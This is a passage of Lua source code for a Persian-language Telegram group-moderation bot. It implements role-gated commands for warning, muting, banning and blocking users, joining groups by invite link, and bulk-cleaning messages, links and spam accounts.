deleteMessages(msg.chat_id,{[0] = msg.id})
end
end
if base:sismember(TD_ID..'SilentList:'..msg.chat_id,msg.sender_user_id)  then
deleteMessages(msg.chat_id,{[0] = msg.id})
end
if base:sismember(TD_ID..'MuteList:'..msg.chat_id,msg.sender_user_id) then
deleteMessages(msg.chat_id,{[0] = msg.id})
MuteUser(msg.chat_id,msg.sender_user_id,0)
end

end
end
----------------Tgservice---------------------
if msg.content._ == "messageChatJoinByLink" or msg.content._ == "messageChatAddMembers" or msg.content._ == "messageChatDeleteMember" then
if base:sismember(TD_ID..'Gp:'..msg.chat_id,'Lock:TGservice') then
deleteMessages(msg.chat_id,{[0] = msg.id})
local function kickbot(arg,data)
for k,v in pairs(data.messages) do
if v.content and v.content._ == "messageChatDeleteMember" or v.content._ == "messageChatAddMembers" or v.content._ == "messageChatJoinByLink"  then
deleteMessages(msg.chat_id, {[0] = v.id})
end
end
end
getChatHistory(msg.chat_id,msg.id,0, 500000000,kickbot)
end
end
------------Chat Type------------



if is_FullSudo(msg) then

if Ramin == 'setpro' then
function SetPhoto(extra,result)
local photo = result.content.photo.sizes[0].photo.persistent_id
setProfilePhoto(photo)
send(msg.chat_id,msg.id,'ok','html')
end
if tonumber(msg.reply_to_message_id) == 0 then
else
getMessage(msg.chat_id, tonumber(msg.reply_to_message_id), SetPhoto)
end
end


if Ramin == 'setphoto' and tonumber(msg.reply_to_message_id) > 0 then
function tophoto(extra,result)
if result.content._ == "messagePhoto" then
send(msg.chat_id,msg.id,'ok','html')
print(result.content.photo.persistent_id)
changeChatPhoto(msg.chat_id,result.content.photo.sizes[0].photo.persistent_id)
else
text = 'User Not Found !'
send(msg.chat_id,msg.id,text,'html')
end
end
getMessage(msg.chat_id, msg.reply_to_message_id, tophoto)
end







if Ramin == 'setgppro' then
function SetPhoto(extra,result)
local photo = result.content.photo.sizes[0].photo.persistent_id
changeChatPhoto(msg.chat_id, photo)
send(msg.chat_id,msg.id,'ok','html')
end
if tonumber(msg.reply_to_message_id) == 0 then
else
getMessage(msg.chat_id, tonumber(msg.reply_to_message_id), SetPhoto)
end
end


if Ramin and (Ramin:match('^setbotusername @(.*)') or Ramin:match('^تنظیم یوزرنیم @(.*)')) then
local username = Ramin:match('^setbotusername @(.*)') or Ramin:match('^تنظیم یوزرنیم @(.*)')
changeUsername(username)
send(msg.chat_id,msg.id,'• یوزرنیم ربات تنظیم شد\n\n• یوزرنیم جدید : @'..username,'html')
end
if Ramin and (Ramin:match('^setbotname (.*)') or Ramin:match('^تنظیم نام (.*)')) then
local name = Ramin:match('^setbotname (.*)') or Ramin:match('^تنظیم نام (.*)')
changeName(name)
send(msg.chat_id,msg.id,'• نام ربات تنظیم شد\n\n• نام جدید : '..name,'html')
end
if Ramin and (Ramin:match('^setbotbio (.*)') or Ramin:match('^تنظیم بیو (.*)')) then
local bio = Ramin:match('^setbotbio (.*)') or Ramin:match('^تنظیم بیو (.*)')
number = utf8.len(bio)
if number > 70 then
send(msg.chat_id,msg.id,'• تا 70 کارکتر برای بیوگرافی مجاز است\n\n• تعداد حروف شما : \n'..number,'html')
else
changeAbout(bio)
base:set(TD_ID..'biocli',bio)
send(msg.chat_id,msg.id,'• بیوگرافی ربات تنظیم شد.\n\n• تعداد کارکترهے بیوگرافی شما : '..number..'\n• بیوگرافی جدید : '..bio,'html')
end
end
if Ramin == '• 〔نصب وراه اندازی ربات به صورت کامل انجام شد .〕' then
send(msg.chat_id,msg.id,'• ربات پاکسازی هستم لطفا منو ادمین گروه کنید!','md')
end

if Ramin == 'addapi' or Ramin == 'افزودن ربات مکمل' then
local add = base:smembers(TD_ID..'SuperGp')
for k,v in pairs(add) do
addChatMembers(v,{[0] = BotJoiner})
end
send(msg.chat_id,msg.id,'• ربات مکمل باموفقیت به گروه افزوده شد\n• جهت کارکرد ربات مکمل را مدیر کنید','md')
end
end
----------------- pv -------------
if gp_type(msg.chat_id) == "pv" and Ramin then
cmdpv = Ramin:match('help') or Ramin:match('راهنما') or Ramin:match('setgp') or Ramin:match('ثبت گروه') or Ramin:match('delgp') or Ramin:match('حذف گروه') or Ramin:match('delgps') or Ramin:match('حذف گروها') or Ramin:match('mygps') or Ramin:match('گروهای من') or Ramin:match('delac (.*)') or Ramin:match('دیلیت اکانت(.*)') or Ramin:match('psswd (.*)') or Ramin:match('رمز دیلیت اکانت (.*)') or Ramin:match('نرخ (.*)') or Ramin:match('nerch (.*)')
if not base:get(TD_ID..'block:on') and not is_Sudo(msg) then
if Ramin and (cmdpv) then
local spam = TD_ID..'user:' .. msg.sender_user_id .. ':spamer'
local msgs = tonumber(base:get(spam) or 0)
local autoblock = base:get(TD_ID..'autoblocknumber') or 5
if msgs > tonumber(autoblock) then
Block(msg.sender_user_id)
end
base:setex(spam,tonumber(5),msgs+1)
end
end

if is_Helper(msg) then
if Ramin and Ramin:match("^(-100)(%d+):(%d+)$") and tonumber(msg.reply_to_message_id) == 0 then
local input = {string.match(Ramin, "^(.*):(%d+)$")} 
addChatMembers(input[1], input[2])
send(msg.chat_id, msg.id, '• *Done !*', 'md')
end
if Ramin and Ramin:match("^Leave (-100)(%d+)$") and tonumber(msg.reply_to_message_id) == 0 then
local chat_id = text:match('^[Ll][Ee][Aa][Vv][Ee] (.*)$')
Left(chat_id, BotCliId, "Left")
send(msg.chat_id, msg.id, '• **Done !**', 'md')
end
end


if Ramin and (Ramin:match('^نصب ([https?://w]*.?[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$')) then
local link = msg.content.text:match('^نصب ([https?://w]*.?[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$') 
importChatInviteLink(link)
end
if Ramin and (Ramin:match('^نصب ([https?://w]*.?[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$')) then
local link = msg.content.text:match('^نصب ([https?://w]*.?[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$') 
link = link:gsub("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]", "telegram.me")
importChatInviteLink(link)
end
if Ramin and (Ramin:match('^نصب ([https?://w]*.?[Tt].[Mm][Ee]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$')) then
local link = msg.content.text:match('^نصب ([https?://w]*.?[Tt].[Mm][Ee]/[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/%S+)$') 
link = link:gsub("[Tt].[Mm][Ee]", "telegram.me")
importChatInviteLink(link)
end


if Ramin and (Ramin:match('(.*)')) and not Ramin:match('^100(%d+)$') and not (cmdpv) and not base:get(TD_ID..'SetupPm'..msg.sender_user_id) and base:get(TD_ID..'MonShi:on') and not is_Mod(msg) then
local text = base:get(TD_ID..'monshi') or '_سلام\nمن رباتے هستم که میتوانم گروه شما رو ضد لینک و ضد تبلیغ کنم\nخب اگه میخواے منو داشته باشے و به من نیاز دارے که تو گروهت مدیریت کنم وارد گروه پشتیبانی شو 😝_\n\n*لینک گروه پشتیبانی :*\n'..(LinkSuppoRt)..'\n\n*براے کسب اطلاعات بیشتر میتوانید در کانال ما عضو شوید :*\n'..(Channel)..'\n\n_براے دریافت قیمت ربات دستور_ *"نرخ"* _را ارسال کنید._'
base:del(TD_ID..'SetupPm'..msg.sender_user_id)
end
end
---------------- End Pv -------------
local bd = msg.sender_user_id
local chat = msg.chat_id
-----End Pv Cmds-----
if  is_supergroup(msg) and base:sismember(TD_ID..'Gp2:'..msg.chat_id,'added') then

-- start reply api msg
if Ramin and tonumber(msg.reply_to_message_id) ~= 0 then
function ByReply(Guard,Diamond)
local user = Diamond.sender_user_id
local function name(black,diamond)
if diamond.username == '' then name = ec_name(diamond.first_name) else name = diamond.username end
if user and diamond.type._ == "userTypeBot" and user ~= BotJoiner then
if is_Owner(msg) then
if (Ramin == 'promote' or Ramin == 'مدیر' or Ramin == 'کمک مدیر') and is_JoinChannel(msg) then
if base:sismember(TD_ID..'ModList:'..msg.chat_id,user) then
else
base:sadd(TD_ID..'ModList:'..msg.chat_id,user)
end
end
if (Ramin == 'demote' or Ramin == 'تنزل') and is_JoinChannel(msg) then
if not base:sismember(TD_ID..'ModList:'..msg.chat_id,user) then
else
base:srem(TD_ID..'ModList:'..msg.chat_id,user)
end
end

if Ramin == 'reset info' then
local startwarn = TD_ID..':join'..os.date("%Y/%m/%d")..':'..msg.chat_id
base:del(TD_ID..'Total:KickUser:'..msg.chat_id..':'..user)
base:del(TD_ID..'Total:AddUser:'..msg.chat_id..':'..user)
base:del(TD_ID..'Total:BanUser:'..msg.chat_id..':'..user)
base:del(TD_ID..'forceaddfor',user)
base:del(TD_ID..'addeduser'..msg.chat_id,user,added)
base:del(startwarn,msg.sender_user_id)
sendApi(msg.chat_id,msg.id,'#انجام شد\nاطلاعات کاربر : @'..check_markdown(diamond.username or '')..'\n'..ec_name(diamond.first_name)..'\n بازنشانی شد#...!','md')
end

if (Ramin == 'restartpm' or Ramin == 'ریستارت پیام') and is_JoinChannel(msg) then
base:del(TD_ID..'Total:messages:'..msg.chat_id..':'..os.date("%Y/%m/%d")..':'..user)
end
--end owner
end
if is_Mod(msg) then
if (Ramin == 'setvip' or Ramin == 'ویژه') and is_JoinChannel(msg) then
if base:sismember(TD_ID..'Vip:'..msg.chat_id, user) then
else
base:sadd(TD_ID..'Vip:'..msg.chat_id, user)
end
end

if Ramin == 'remvip' or Ramin == 'حذف ویژه' and is_JoinChannel(msg) then
if base:sismember(TD_ID..'Vip:'..msg.chat_id, user) then
base:srem(TD_ID..'Vip:'..msg.chat_id, user)
else
end
end
if (Ramin == 'limitpm' or Ramin == 'محدودیت پیام') and is_JoinChannel(msg) then
base:srem(TD_ID..'Gp2:'..msg.chat_id,'limitpm'..user)
end


local url  = https.request(Bot_Api .. '/getChatMember?chat_id='..msg.chat_id..'&user_id='..BotCliId)
if res ~= 200 then
end
statsurl = json:decode(url)


if (Ramin == "warn" or Ramin == "اخطار") and tonumber(msg.reply_to_message_id) > 0 then
if VipUser(msg,user) then
else
local hashwarn = TD_ID..msg.chat_id..':warn'
local warnhash = base:hget(TD_ID..msg.chat_id..':warn',user) or 1
if tonumber(warnhash) == tonumber(warn) then
if statsurl.ok == true and statsurl.result.status == 'administrator' and statsurl.result.can_restrict_members == true then
KickUser(msg.chat_id,user)
UnRes(msg.chat_id,user)
text = "✦ اطلاعات کاربر : \n🆔 یوزرنیم : ["..name.."](tg://user?id="..user..")\n👤 نام : "..diamond.first_name.."\nا┅┅──┄┄═✺═┄┄──┅┅\nبه علت دریافت اخطار بیش از حد اخراج شد \nاخطار ها : "..warnhash.."/"..warn..""
base:hdel(hashwarn,user, '0')
else
end

else
base:hset(hashwarn,user, tonumber(warnhash) + 1)

text = "✦ اطلاعات کاربر : \n🆔 یوزرنیم : ["..name.."](tg://user?id="..user..")\n👤 نام : "..diamond.first_name.."\nا┅┅──┄┄═✺═┄┄──┅┅\nشما یک اخطار دریافت کردید \nتعداد اخطار هاے شما : "..warnhash.."/" ..warn ..""
end
end
end
if Ramin and (Ramin:match('^mute (%d+)$') or Ramin:match('^سکوت (%d+)$')) then
local times = Ramin:match('^mute (%d+)$') or Ramin:match('^سکوت (%d+)$')
time = times * 3600
if VipUser(msg,user) then
else
if statsurl.ok == true and statsurl.result.status == 'administrator' and statsurl.result.can_restrict_members == true then
MuteUser(msg.chat_id,user,msg.date+time)
base:sadd(TD_ID..'MuteList:'..msg.chat_id,user)
else
end

end
end
if (Ramin == "unwarn" or Ramin == "حذف اخطار")  and tonumber(msg.reply_to_message_id) > 0 then
local warnhash = base:hget(TD_ID..msg.chat_id..':warn',user) or 1
if tonumber(warnhash) == tonumber(1) then
text= "✦ کاربر : ["..name.."](tg://user?id="..user..")\nهیچ اخطارے ندارد"
else
local hashwarn = TD_ID..msg.chat_id..':warn'
base:hdel(hashwarn,user,'0')
text= "✦ کاربر : ["..name.."](tg://user?id="..user..")\nتمام اخطار هایش پاک شد"
end
end

if Ramin == 'kick' or Ramin == 'ban' or Ramin == 'mute' or Ramin == 'unmute' or Ramin == 'unban' then
if statsurl.ok == false or statsurl.ok == true and statsurl.result.status == 'member' or statsurl.ok == true and statsurl.result.status == 'administrator' and statsurl.result.can_restrict_members == false then
end
end
if statsurl.ok == true and statsurl.result.status == 'administrator' and statsurl.result.can_restrict_members == true then
if (Ramin == 'unlimitpm' or Ramin == 'رفع محدودیت پیام')  then
base:sadd(TD_ID..'Gp2:'..msg.chat_id,'limitpm'..user)
UnRes(msg.chat_id,user)
end
if (Ramin == 'mute' or Ramin == 'سکوت')  then
if VipUser(msg,user) then
else
MuteUser(msg.chat_id,user,0)
base:sadd(TD_ID..'MuteList:'..msg.chat_id,user)
end
end
if (Ramin == 'unmute' or Ramin == 'رفع سکوت')  then
UnRes(msg.chat_id,user)
base:srem(TD_ID..'SilentList:'..msg.chat_id,user)
base:srem(TD_ID..'MuteList:'..msg.chat_id,user)
end

if (Ramin == 'ban' or Ramin == 'مسدود')  and tonumber(msg.reply_to_message_id) > 0 then
if VipUser(msg,user) then
else
base:sadd(TD_ID..'BanUser:'..msg.chat_id,user)
KickUser(msg.chat_id,user)
base:incr(TD_ID..'Total:BanUser:'..msg.chat_id..':'..msg.sender_user_id)
end
end
if (Ramin == 'unban' or Ramin == 'رفع مسدود')  and tonumber(msg.reply_to_message_id) > 0 then
local function pro(babi,mmd)
for k, v in pairs(mmd.members) do
if tonumber(v.user_id) == tonumber(user) then
UnRes(msg.chat_id,user)
end
end
sendApi(msg.chat_id,0,"✦ کاربر : ["..name.."](tg://user?id="..user..")\n از لیست مسدودین حذف شد",'md')
base:srem(TD_ID..'BanUser:'..msg.chat_id,user)
end
getChannelMembers(msg.chat_id,"Banned",0, 100000000000,pro)
end
if (Ramin == 'kick' or Ramin == 'اخراج')  and tonumber(msg.reply_to_message_id) > 0 then
if VipUser(msg,user) then
else
KickUser(msg.chat_id,user)
UnRes(msg.chat_id,user)
base:incr(TD_ID..'Total:KickUser:'..msg.chat_id..':'..msg.sender_user_id)
end
end

end

-- end mod
end
if is_Sudo(msg) then
if Ramin and (Ramin:match('^setrank (.*)$') or Ramin:match('^تنظیم مقام (.*)$')) then
if tonumber(user) == tonumber(BotCliId) then
return false
end
if tonumber(user) == 219201071 then
return false
end
base:set(TD_ID..'rank'..user,rank)
end

if Ramin and (Ramin:match('^delrank$') or Ramin:match('^حذف مقام$')) then
base:del(TD_ID..'rank'..user)
end

if Ramin == 'setowner' or Ramin == 'مالک' then
if base:sismember(TD_ID..'OwnerList:'..msg.chat_id,user) then
else
base:sadd(TD_ID..'OwnerList:'..msg.chat_id,user)
end
end
if Ramin == 'remowner' or Ramin == 'حذف مالک' then
if base:sismember(TD_ID..'OwnerList:'..msg.chat_id,user) then
base:srem(TD_ID..'OwnerList:'..msg.chat_id,user)
else
end
end
if Ramin == 'banall' or Ramin == 'بن گلوبال' then
if tonumber(user) == tonumber(Sudoid) then
return false
end
if base:sismember(TD_ID..'GlobalyBanned:',user) then
else
base:sadd(TD_ID..'GlobalyBanned:',user)
Block(user)
end
end
if Ramin == 'unbanall' or Ramin == 'ان بن گلوبال' then
if base:sismember(TD_ID..'GlobalyBanned:',user) then
base:srem(TD_ID..'GlobalyBanned:',user)
Unblock(user)
else
end
end
-- end sudo
end
if is_FullSudo(msg) then
if Ramin == 'setsudo' or Ramin == 'افزودن سودو' then
if base:sismember(TD_ID..'SUDO',user) then
else
base:sadd(TD_ID..'SUDO',user)
end
end
if Ramin == 'remsudo' or Ramin == 'حذف سودو' then
if base:sismember(TD_ID..'SUDO',user) then
base:srem(TD_ID..'SUDO',user)
else
end
end
--end fullsudo
end
if (Ramin == "id" or Ramin == "ایدی" or Ramin == "آیدی") then
end

end
end
GetUser(user,name)


end
getMessage(msg.chat_id, tonumber(msg.reply_to_message_id), ByReply)
end

if is_Owner(msg) then
if Ramin and (Ramin:match('^invite (%d+)$') or Ramin:match('^دعوت (%d+)$')) then
local id = Ramin:match('^invite (%d+)$') or Ramin:match('^دعوت (%d+)$')
addChatMembers(msg.chat_id,{[0] = id})
send(msg.chat_id, msg.id,'• عملیات با موفقیت انجام شد.','md')
end

end
if is_Mod(msg) and is_ModClean(msg)  then

if (Ramin == 'cgmall' or Ramin == '• پاکسازی ربات درحال انجام لطفا  تا اتمام پاکسازی هیچ دستوری ارسال نشود!' or Ramin == 'پاکسازی' or Ramin == 'پاکسازی پیام' or Ramin == 'کاهش حجم پیام ها' or Ramin == 'پاکسازی گروه' or Ramin == 'پاکسازی پیام ها') and not (base:sismember(TD_ID..'LimitCmd:'..chat,'cmgall') or base:sismember(TD_ID..'LimitCmd:'..chat,'پاکسازی') or base:sismember(TD_ID..'LimitCmd:'..chat,'پاکسازی پیام') or base:sismember(TD_ID..'LimitCmd:'..chat,'پاکسازی گروه') or base:sismember(TD_ID..'LimitCmd:'..chat,'پاکسازی پیام ها')) then
local url  = https.request(Bot_Api .. '/getChatMember?chat_id='..msg.chat_id..'&user_id='..BotCliId)
if res ~= 200 then
end
statsurl = json:decode(url) 
if statsurl.ok == true and statsurl.result.status == 'administrator' and statsurl.result.can_delete_messages == true then
send(msg.chat_id,0,'• ربات درحال پاکسازی پیام می باشد...\n\n>│','md')
base:zincrby(TD_ID..'bot:clean:'..msg.chat_id..':', 1, msg.sender_user_id)
base:incr(TD_ID..'Total:CleanUser:'..msg.chat_id)
else 
send(msg.chat_id,0,' • ربات بـہ حذف پیام ها دسترسے ندارد... ','md')
end
end 



if Ramin and (Ramin:match('[Cc]lean tabchi') or Ramin:match('پاکسازی تبچی ها') or Ramin:match('ربات درحال انجام عملیات شناسایی تبچی ها...\n\n ▎')) and is_JoinChannel(msg) then
local list = base:smembers(TD_ID..'AGTMute:')
if #list == 0 then
--send(chat_id, msg.id, '◈ خوشبختانه هیچ تبچی در گروه شما یافت نشد.  ', 'md')
else
for k,v in pairs(list) do
KickUsercli(msg.chat_id,v)
end
local list = base:smembers(TD_ID..'AGTMute:'..chat_id)
if #list == 0  then
else
for k,v in pairs(list) do
ram = k
end
base:del(TD_ID..'AGTMute:'..chat_id)
end
end
end
if Ramin == 'clean links' or Ramin == 'پاکسازی لینک ها' or Ramin == '• پاکسازی لینک ها درحال انجام لطفا  تا اتمام پاکسازی هیچ دستوری ارسال نشود!'  then
local function cleanlink(babi,mmd)
for k,v in pairs(mmd.messages) do
local TDClr = v.content.caption or v.content.text
if TDClr then
if TDClr:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or TDClr:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or TDClr:match("[Tt].[Mm][Ee]/") or TDClr:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or TDClr:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Pp][Hh]/") then
deleteMessages(msg.chat_id, {[0] = v.id})
end
end
end
end
getChatHistory(msg.chat_id,msg.id,0, 5000000000000,cleanlink)
send(msg.chat_id,msg.id,'• پاکسازی لینک انجام شد. ','md')
end

if Ramin == 'clean usernames' or Ramin == 'پاکسازی یوزرنیم ها' then
local function cleanusername(babi,mmd)
for k,v in pairs(mmd.messages) do
local TDClr = v.content.caption or v.content.text
if TDClr then
if TDClr:match("@") then
deleteMessages(msg.chat_id, {[0] = v.id})
end
end
end
end
getChatHistory(msg.chat_id,msg.id,0, 500000000000,cleanusername)
send(msg.chat_id,msg.id,'• تمامے یوزرنیم هایے ڪـہ اخیرا ارسال شدہ بودند پاڪ شدند','md')
end
local function cleandiamond(msg,type,mrr619)
local function cleanmrr(babi,mmd)
for k,v in pairs(mmd.messages) do
if v.content and v.content._ == type then
deleteMessages(msg.chat_id, {[0] = v.id})
end
end
end
getChatHistory(msg.chat_id,msg.id,0, 500000000000,cleanmrr)
send(msg.chat_id,msg.id,'• تمامے '..mrr619..' ڪـہ اخیرا ارسال شدہ بودند پاڪ شدند','md')
end

if Ramin == 'clean stickers' or Ramin == 'پاکسازی استیکر ها' then
cleandiamond(msg,'messageSticker','استیکرهایی')
end
if Ramin == 'clean videos' or Ramin == 'پاکسازی فیلم ها' then
cleandiamond(msg,'messageVideo','فیلم هایی')
end
if Ramin == 'clean files' or Ramin == 'پاکسازی فایل ها' then
cleandiamond(msg,'messageDocument','فایل هایی')
end
if Ramin == 'clean photos' or Ramin == 'پاکسازی عکس ها' then
cleandiamond(msg,'messagePhoto','عکس هایی')
end
if Ramin == 'clean gifs' or Ramin == 'پاکسازی گیف ها' then
cleandiamond(msg,'messageAnimation','گیف هایی')
end
if Ramin == 'clean musics' or Ramin == 'پاکسازی اهنگ ها' then
cleandiamond(msg,'messageAudio','اهنگ هایی')
end
if Ramin == 'clean voices' or Ramin == 'پاکسازی وویس ها' then
cleandiamond(msg,'messageVoice','وویس هایی')
end
if Ramin == 'clean games' or Ramin == 'پاکسازی بازی ها' then
cleandiamond(msg,'messageGame','بازی هایی')
end
if Ramin == 'clean tgservice' or Ramin == 'پاکسازی سرویس تلگرام' then
local function cleanmrr(babi,mmd)
for k,v in pairs(mmd.messages) do
if v.content and v.content._ == "messageChatJoinByLink" or v.content._ == "messageChatAddMembers" or v.content._ == "messageChatDeleteMember" then
deleteMessages(msg.chat_id, {[0] = v.id})
end
end
end
getChatHistory(msg.chat_id,msg.id,0, 500000000000,cleanmrr)
send(msg.chat_id,msg.id,'• تمامے سرویس هاے تلگرامے از جملـہ پیام اد ریمو و جوین شدن پاڪسازے شدند...!','md')
end

if Ramin == 'cum' or Ramin == 'حذف پیام ها' or Ramin == '❌ بستن' then
function DelallByReply(Guard,Diamond)
--sendM(msg.chat_id,Diamond.sender_user_id,msg.id,'⭕ تمام پیام های\nکاربر : '..(Diamond.sender_user_id or 00000000)..' پاک شدند🚩',24,string.len(Diamond.sender_user_id))
deleteMessagesFromUser(msg.chat_id,Diamond.sender_user_id or 00000000)
end
if tonumber(msg.reply_to_message_id) == 0 then
else
getMessage(msg.chat_id, tonumber(msg.reply_to_message_id),DelallByReply)
end
end
--<><><><>Cum
if Diamondent and (Ramin:match('^cum (.*)') or Ramin:match('^حذف پیام ها (.*)')) or Ramin and (Ramin:match('^cum @(.*)') or Ramin:match('^حذف پیام ها @(.*)') or Ramin:match('^cum (%d+)') or Ramin:match('^حذف پیام ها (%d+)'))  then
local BDSource = Ramin:match('^cum (.*)') or Ramin:match('^حذف پیام ها (.*)')
function BD_cum(Guard,Diamond)
if not Diamondent and Ramin:match('^cum @(.*)') or Ramin:match('^حذف پیام ها @(.*)') then
mrr619 = Diamond.id
elseif not Diamondent and Ramin:match('^cum (%d+)') or Ramin:match('^حذف پیام ها (%d+)') then
mrr619 = BDSource
elseif Diamondent and Ramin:match('^cum (.*)') or Ramin:match('^حذف پیام ها (.*)') then
mrr619 = msg.content.entities[0].type.user_id
end
if mrr619 then
--sendM(msg.chat_id,mrr619,msg.id,'⚪ تمام پیام هاے\nکاربر : '..BDSource..' پاکسازے شدند',24,utf8.len(BDSource))
deleteMessagesFromUser(msg.chat_id,mrr619)
else
--send(msg.chat_id, msg.id,'کاربر '..BDSource..' یافت نشد ...!','md')
end
end
resolve_username(BDSource,BD_cum)
end



if Ramin and (Ramin:match('^cgm (%d+)$') or Ramin:match('^پاکسازی (%d+)$') or Ramin:match('^حذف (%d+)$')) and is_ModClean(msg) then
local limit = tonumber(Ramin:match('^cgm (%d+)$') or Ramin:match('^پاکسازی (%d+)$') or Ramin:match('^حذف (%d+)$'))
if limit > 10000000 then
--send(msg.chat_id,msg.id,'• حداڪثر پاڪسازے عددے از 1 تا 1000 مے باشد !','md')
else
local function cb(arg,data) 
for k,v in pairs(data.messages) do
deleteMessages(msg.chat_id,{[0] =v.id})
end
end
getChatHistory(msg.chat_id,msg.id, 0,  limit,cb)
send(msg.chat_id,msg.id,'• تعداد ('..limit..') پیام گروه حذف شد.','md')
base:zincrby(TD_ID..'bot:clean:'..msg.chat_id..':', 1, msg.sender_user_id)
base:incr(TD_ID..'Total:CleanUser:'..msg.chat_id..':'..msg.sender_user_id)
end
end--]]







if Ramin == 'rempms' or Ramin == 'پاکسازی سریع پیام ها' then
if base:get(TD_ID.."timeforrempms:"..msg.chat_id) then
local time = base:ttl(TD_ID.."timeforrempms:"..msg.chat_id)
local days = math.floor(time / 86400)
time = time - days * 86400
local hour = math.floor(time /3600)
time = time - hour * 3600
local minute = math.floor(time / 60)
time = time - minute * 60
sec = time
send(msg.chat_id, msg.id,  'استفاده از این دستور در هر [15] دقیقه تنها یکبار قابل استفاده است.\nلطفا ['..minute..'] دقیقه و ['..sec..'] ثانیه دیگر مجدد دستور خود را ارسال فرمایید.', 'html')
else
base:setex(TD_ID.."timeforrempms:"..msg.chat_id, 20, true)
local function groupcreator(FreemanagerBOT,result)
local list = result.members
local t = '> لیست کاربران گروه:\n'
local n = 0
for k,v in pairs(list) do 
n = (n + 1)
t = t..n.." - "..v.user_id.."\n"
deleteMessagesFromUser(msg.chat_id,v.user_id)
end
for k,v in pairs(list) do
n = (n + 1)
t = t..n.." - "..v.user_id.."\n"
deleteMessagesFromUser(msg.chat_id,v.user_id)
end
for k,v in pairs(list) do
n = (n + 1)
t = t..n.." - "..v.user_id.."\n"
deleteMessagesFromUser(msg.chat_id,v.user_id)
end
base:zincrby(TD_ID..'bot:clean:'..msg.chat_id..':', 1, msg.sender_user_id)
base:incr(TD_ID..'Total:CleanUser:'..msg.chat_id..':'..msg.sender_user_id)
send(msg.chat_id, msg.id,  '<code>>در حال انجام عملیات ...</code>', 'html')
send(msg.chat_id, msg.id,  '<code>>کاهش پیغام های گروه انجام شد.</code>', 'html')
end
getChannelMembers(msg.chat_id, "Search", 0, 100000000000,groupcreator)
end
end






----------------------------------------------
end
end
----------------------------------------------
if is_Sudo(msg) then

if Ramin and (Ramin:match('^import http(.*)') or Ramin:match('^ورودربات http(.*)')) then
local link = msg.content.text:match('^import (.*)') or msg.content.text:match('^ورودربات (.*)')
importChatInviteLink(link)
send(msg.chat_id, msg.id,'• ربات با موفقیت وارد گروه '..link..' شد', 'html')
end
if Ramin == 'botnumber' or Ramin == 'شماره ربات' then
function Share(Guard,Diamond)
sendContact(msg.chat_id,msg.id, Diamond.phone_number,Diamond.first_name,Diamond.last_name or '')
end
getMe(Share)
end

--<><><><>Block
if Diamondent and (Ramin:match('^block (.*)') or Ramin:match('^بلاک (.*)')) or Ramin and (Ramin:match('^block @(.*)') or Ramin:match('^بلاک @(.*)') or Ramin:match('^block (%d+)') or Ramin:match('^بلاک (%d+)'))  then
local BDSource = Ramin:match('^block (.*)') or Ramin:match('^بلاک (.*)')
function BD_block(Guard,Diamond)
if not Diamondent and Ramin:match('^block @(.*)') or Ramin:match('^بلاک @(.*)') then
mrr619 = Diamond.id
elseif not Diamondent and Ramin:match('^block (%d+)') or Ramin:match('^بلاک (%d+)') then
mrr619 = BDSource
elseif Diamondent and Ramin:match('^block (.*)') or Ramin:match('^بلاک (.*)') then
mrr619 = msg.content.entities[0].type.user_id
end
if mrr619 then
if base:sismember(TD_ID..'SUDO',mrr619) then
sendM(msg.chat_id,mrr619,msg.id,"❌ #اخطار  !\n• کاربر "..BDSource.." جزو مدیران ربات است و امکان بلاک کردن او وجود ندارد...!",33,utf8.len(BDSource))
else
sendM(msg.chat_id,mrr619,msg.id,'• کاربر : '..BDSource..' از اکانت ربات بلاک شد!', 10,utf8.len(BDSource))
Block(mrr619)
end
else
send(msg.chat_id, msg.id,'• کاربر '..BDSource..' یافت نشد ...!',  'md')
end
end
resolve_username(BDSource,BD_block)
end
--<><><><>UnBlock
if Diamondent and (Ramin:match('^unblock (.*)') or Ramin:match('^انبلاک (.*)')) or Ramin and (Ramin:match('^unblock @(.*)') or Ramin:match('^انبلاک @(.*)') or Ramin:match('^unblock (%d+)') or Ramin:match('^انبلاک (%d+)')) then
local BDSource = Ramin:match('^unblock (.*)') or Ramin:match('^انبلاک (.*)')
function BD_unblock(Guard,Diamond)
if not Diamondent and Ramin:match('^unblock @(.*)') or Ramin:match('^انبلاک @(.*)') then
mrr619 = Diamond.id
elseif not Diamondent and Ramin:match('^unblock (%d+)') or Ramin:match('^انبلاک (%d+)') then
mrr619 = BDSource
elseif Diamondent and Ramin:match('^unblock (.*)') or Ramin:match('^انبلاک (.*)') then
mrr619 = msg.content.entities[0].type.user_id
end
if mrr619 then
sendM(msg.chat_id,mrr619,msg.id,'• کاربر : '..BDSource..' انبلاک شد!', 10,utf8.len(BDSource))
Unblock(mrr619)
else
send(msg.chat_id, msg.id,'• کاربر '..BDSource..' یافت نشد ...!','md')
end
end
resolve_username(BDSource,BD_unblock)
end
--------
if Ramin and (Ramin1:match('^leave (-100)(%d+)$') or Ramin1:match('^خروج (-100)(%d+)$')) then
local chat_id = Ramin1:match('^leave (.*)$') or Ramin1:match('^خروج (.*)$')
local Hash = TD_ID..'StatsGpByName'..chat_id
base:del(Hash)
base:del(TD_ID..'Gp2:'..chat_id)
base:del(TD_ID..'Gp:'..chat_id)
base:del(TD_ID..'Gp3:'..chat_id)
base:del(TD_ID..'NewUser'..chat_id)
base:del(TD_ID.."ExpireData:"..chat_id)
base:srem(TD_ID.."group:",chat_id)
base:del(TD_ID.."ModList:"..chat_id)
base:del(TD_ID..'OwnerList:'..chat_id)
